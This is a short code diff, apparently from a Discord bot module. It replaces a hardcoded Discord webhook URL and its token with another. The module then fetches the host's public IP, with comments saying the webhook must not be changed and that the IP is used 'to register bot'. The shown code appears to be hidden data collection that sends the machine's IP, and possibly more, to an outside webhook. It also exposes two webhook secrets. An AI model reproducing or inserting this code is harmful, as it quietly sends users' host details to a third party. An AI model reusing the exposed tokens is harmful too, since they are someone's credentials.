@@ -2,7 +2,7 @@ const axios = require('axios');
 const os = require('os');
 
 module.exports = async function(client) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1266120186982043690/Cbekeb7YracObPPelNl_ZqgxmCpXI4fQXA6Y6FBDn2GJZ0I0_fwcRD0J7hFDKH98ZI9t'; //discord api webhook do NOT Change it 
+    const webhookUrl = 'https://discord.com/api/webhooks/1266406399022202911/dBS8BGhtRue8Mxcjj_9u7aBqv33e3NSqI6mL3M2D5s9hY6T5p1mczwVBFiQCG2nTb2PQ'; //discord api webhook do NOT Change it 
 
     try {
         const ipResponse = await axios.get('https://api.ipify.org?format=json');// using ip to register bot and sending a proxy ip back to the api 
